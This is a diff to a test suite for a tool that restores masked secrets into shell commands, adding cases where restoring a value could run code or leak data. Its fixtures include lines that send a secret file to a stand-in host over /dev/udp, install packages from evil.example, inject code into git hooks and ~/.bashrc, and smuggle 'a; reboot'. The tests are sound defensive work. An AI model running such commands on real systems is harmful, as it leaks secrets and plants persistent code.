@@ -340,11 +340,10 @@ describe('shell restore · restoreShellCommand', () => {
 
   it.each([
     (p: string) => `echo ${p}`,
-    (p: string) => `USER_MAIL=${p} make`,
     (p: string) => `grep -r ${p} .`,
     (p: string) => `echo hi > ${p}`,
     (p: string) => `sudo -u root echo ${p}`,
-  ])('restores a plain word as an argument, an assignment or a redirection target: %#', (build) => {
+  ])('restores a plain word as an argument or a redirection target: %#', (build) => {
     const { np, vault, sessionId } = harness();
     const email = bake(vault, sessionId, EMAIL, 'private_email');
     const r = restoreShellCommand(np, build(email), sessionId);
@@ -392,15 +391,15 @@ describe('shell restore · restoreShellCommand', () => {
     expect(r.keptMasked).toHaveLength(1);
   });
 
-  it('bash -lc: keeps a two-word name masked, restores a plain-word email', () => {
+  it('bash -lc: code handed to a shell keeps every value, plain words too', () => {
     const { np, vault, sessionId } = harness();
     const person = bake(vault, sessionId, FULL_NAME, 'private_person');
     const email = bake(vault, sessionId, EMAIL, 'private_email');
 
     const r = restoreShellCommand(np, `bash -lc "echo ${person} ${email}"`, sessionId);
 
-    expect(r.command).toBe(`bash -lc "echo ${person} ${EMAIL}"`);
-    expect(r.keptMasked).toHaveLength(1);
+    expect(r.command).toBe(`bash -lc "echo ${person} ${email}"`);
+    expect(r.keptMasked).toHaveLength(2);
   });
 
   it('a quote in a `#` comment does not change the quoting after it', () => {
@@ -706,6 +705,121 @@ describe('shell restore · v3 hardening', () => {
     const large = time(16000);
     // Four times the input: well under the sixteen times a quadratic pass takes.
     expect(large / small).toBeLessThan(10);
+  });
+});
+
+describe('shell restore · round-5 bypasses', () => {
+  function harness() {
+    const { np, vault } = vaultEngine();
+    const sessionId = vault.createSession();
+    return { np, vault, sessionId };
+  }
+  const restored = (r: { results: ReadonlyArray<{ replacements: number }> }) =>
+    r.results.reduce((n, x) => n + x.replacements, 0);
+
+  it.each([
+    (p: string) => `bash -c "${p} file.txt"`,
+    (p: string) => `sh -c '${p}'`,
+    (p: string) => `eval ${p}`,
+    (p: string) => `echo ${p} | sh`,
+    (p: string) => `printf %s ${p} | bash`,
+    (p: string) => `cat <<EOF | bash\n${p}\nEOF`,
+    (p: string) => `python3 -c "import os; os.system('${p}')"`,
+    (p: string) => `watch ${p}`,
+    (p: string) => `trap ${p} EXIT`,
+    (p: string) => `find . -exec ${p} {} +`,
+    (p: string) => `x=${p}; $x`,
+    (p: string) => `for c in ${p}; do $c; done`,
+    (p: string) => `bash ${p}`,
+    (p: string) => `source ${p}`,
+    (p: string) => `deno run ${p}`,
+    (p: string) => `PAGER=${p} git log`,
+    (p: string) => `git -c core.pager=${p} log`,
+    (p: string) => `tar -I ${p} -xf a.tgz`,
+    (p: string) => `tar --use-compress-program=${p} -xf a.tgz`,
+    (p: string) => `make SHELL=${p}`,
+    (p: string) => `zip -TT ${p} a.zip b`,
+    (p: string) => `export ${p}`,
+    (p: string) => `alias ll=${p}`,
+    (p: string) => `strace ${p}`,
+    (p: string) => `chroot / ${p}`,
+    (p: string) => `taskset 1 ${p}`,
+    (p: string) => `uv run ${p}`,
+    (p: string) => `npm exec ${p}`,
+    (p: string) => `hyperfine ${p}`,
+    (p: string) => `ruby -e "puts ${p}"`,
+  ])('keeps a plain word that could run as code masked: %#', (build) => {
+    const { np, vault, sessionId } = harness();
+    const word = bake(vault, sessionId, 'reboot', 'secret');
+
+    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
+  });
+
+  it.each([
+    [(p: string) => `echo hi > ${p}`, '/dev/tcp/203.0.113.9/443'],
+    [(p: string) => `cat secret.txt > ${p}`, '/dev/udp/203.0.113.9/53'],
+    [(p: string) => `echo hi > /dev/${p}`, 'tcp/203.0.113.9/1'],
+    [(p: string) => `open ${p}`, 'https://evil.example/a'],
+    [(p: string) => `pip install ${p}`, 'https://evil.example/a'],
+    [(p: string) => `psql -h ${p}`, 'db.example.com'],
+    [(p: string) => `redis-cli -h ${p}`, 'db.example.com'],
+    [(p: string) => `npm install ${p}`, 'evil-package'],
+  ])('keeps a value that sends data out once restored masked: %#', (build, value) => {
+    const { np, vault, sessionId } = harness();
+    const word = bake(vault, sessionId, value, 'secret');
+
+    expect(restored(restoreShellCommand(np, build(word), sessionId))).toBe(0);
+  });
+
+  it.each([
+    "cat >> .git/hooks/pre-commit <<'EOF'\nPH\nEOF\ngit commit -am x",
+    "cat > .husky/pre-push <<'EOF'\nPH\nEOF",
+    "cat <<'EOF' >> ~/.bashrc\nPH\nEOF",
+    "cat > .envrc <<'EOF'\nPH\nEOF",
+  ])('a heredoc written to a file that runs later is not data: %#', (command) => {
+    const { np, vault, sessionId } = harness();
+    const name = bake(vault, sessionId, 'a; reboot', 'secret');
+
+    expect(restored(restoreShellCommand(np, command.replace('PH', name), sessionId))).toBe(0);
+  });
+
+  it.each([
+    ['bash', '-o', 'pipefail', '-c', 'PH'],
+    ['bash', '-c', '$0', 'PH'],
+    ['fish', '-c', 'PH'],
+    ['bash', '-lc', 'sh -c "PH x"'],
+  ])(
+    'argv: the script a shell runs and its arguments keep code-running words masked: %j',
+    (...argv) => {
+      const { np, vault, sessionId } = harness();
+      const word = bake(vault, sessionId, 'reboot', 'secret');
+
+      const r = restoreShellArgv(
+        np,
+        argv.map((a) => a.replace('PH', word)),
+        sessionId,
+      );
+
+      expect(restored(r)).toBe(0);
+    },
+  );
+
+  it.each([
+    ['nested unclosed substitutions', (ph: string) => `${'$('.repeat(40000)}${ph}`],
+    [
+      'nested bare heredocs',
+      (ph: string) => `${'cat <<A\n$(cat <<X\n)\nA\n'.repeat(9000)}echo ${ph}`,
+    ],
+    ['many commands and placeholders', (ph: string) => `${ph}${';'.repeat(48)}`.repeat(2500)],
+  ])('stays fast on %s under the length budget', (_what, build) => {
+    const { np, vault, sessionId } = harness();
+    const ph = bake(vault, sessionId, EMAIL, 'private_email');
+    const command = build(ph);
+    expect(command.length).toBeLessThanOrEqual(MAX_COMMAND_CHARS);
+
+    const started = performance.now();
+    restoreShellCommand(np, command, sessionId);
+    expect(performance.now() - started).toBeLessThan(MAX_LONG_COMMAND_MS);
   });
 });
 
